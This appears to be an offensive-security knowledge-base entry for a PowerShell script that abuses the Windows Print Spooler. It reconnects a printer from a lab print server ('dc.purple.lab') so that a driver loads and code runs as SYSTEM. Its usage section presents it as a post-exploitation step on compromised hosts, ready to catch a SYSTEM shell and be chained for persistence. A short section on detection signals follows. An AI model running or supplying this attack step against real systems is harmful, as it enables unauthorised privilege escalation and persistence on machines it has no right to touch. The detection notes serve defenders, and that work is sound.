---
id: 3ca69640-3051-45e8-bb46-151e342ce658
name: powershell-universal-printer-driver-injection
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:29.835438+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - print-spooler
  - payload
validated: true
---

# powershell-universal-printer-driver-injection

## Code

```powershell
$serverName  = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

## Description

This PowerShell script automates the removal and re-addition of a network printer connection using the Universal Printer Driver, exploiting the Print Spooler Service to inject and execute malicious code under SYSTEM privileges. It dynamically detects the system architecture to construct the correct connection path.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$serverName` | Name or FQDN of the target print server | `dc.purple.lab` |
| `$printerName` | Name of the printer share to target | `Universal Priv Printer` |
| `$fullprinterName` | Constructed full UNC path including architecture | `\\dc.purple.lab\Universal Priv Printer - x64` |

## Usage

Execute this script on a compromised Windows host with printer management permissions. It is typically run during post-exploitation for privilege escalation. Set up variables before running, and ensure a listener or payload is prepared to capture the resulting SYSTEM shell. Integrate into larger attack chains for persistence after initial access.

## Detection

- Monitor PowerShell execution logs for Remove-Printer and Add-Printer cmdlets (Module Logging or Script Block Logging).
- Watch for Event ID 808 or 2003 in Microsoft-Windows-PrintService/Operational log indicating driver loads.
- Sysmon events for process injection into spoolsv.exe or unexpected network connections from the spooler process.
- File system changes in %SystemRoot%\System32\spool\drivers.

## Related

- [[procedures/windows-privilege-escalation-via-universal-printer-driver]]
- [[commands/remove-printer-connection]]
- [[commands/add-printer-connection]]
